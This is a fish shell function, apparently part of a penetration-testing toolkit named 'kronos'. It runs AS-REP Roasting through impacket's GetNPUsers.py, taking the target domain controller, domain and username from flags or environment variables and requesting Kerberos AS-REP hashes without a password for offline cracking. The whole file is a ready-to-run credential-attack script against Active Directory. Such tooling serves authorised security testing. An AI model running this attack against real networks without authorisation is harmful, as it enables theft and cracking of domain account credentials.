# description: Run AS-REP Roasting using GetNPUsers.py
function __kronos_asrep_roast --description "Run AS-REP Roasting using GetNPUsers.py"
    argparse h/help u/username= d/domain= k/kerberos -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos asrep-roast [TARGET] [OPTIONS]"
        echo ""
        echo "Run AS-REP Roasting using impacket's GetNPUsers.py."
        echo ""
        echo "Arguments:"
        echo "  TARGET              IP, hostname, or nameserver (falls back to \$TGT_DC_IP or \$TGT_DC)"
        echo ""
        echo "Options:"
        echo "  -u, --username USER Provide username (falls back to \$TGT_CRED_USERNAME)"
        echo "  -d, --domain DOMAIN Target domain (falls back to \$TGT_DC_DOMAIN)"
        echo "  -k, --kerberos      Use Kerberos authentication (requires KRB5CCNAME)"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $argv[1]
    if test -z "$target"; set target $TGT_DC_IP; end
    if test -z "$target"; set target $TGT_DC; end
    if test -z "$target"; set target $TGT; end
    
    if test -z "$target"
        echo "error: target is required" >&2
        return 1
    end

    set -l domain $_flag_domain
    if test -z "$domain"; set domain $TGT_DC_DOMAIN; end
    if test -z "$domain"
        echo "error: domain is required" >&2
        return 1
    end

    set -l user $_flag_username; if test -z "$user"; set user $TGT_USERNAME; end
    if test -z "$user"; set user $TGT_CRED_USERNAME; end
    if test -z "$user"
        echo "error: username is required" >&2
        return 1
    end

    set -l impacket_cmd ""
    if command -v GetNPUsers.py >/dev/null
        set impacket_cmd GetNPUsers.py
    else if command -v impacket-GetNPUsers >/dev/null
        set impacket_cmd impacket-GetNPUsers
    else
        echo "error: GetNPUsers not found. run 'kronos install'." >&2
        return 1
    end

    set -l roast_args "$domain/$user" -dc-ip "$target" -no-pass -request
    if set -q _flag_kerberos
        set -a roast_args -k
    end

    __kronos_check_dep $impacket_cmd; or return 1

    echo "[*] Running $impacket_cmd against $target for user $user@$domain..."
    command $impacket_cmd $roast_args
end
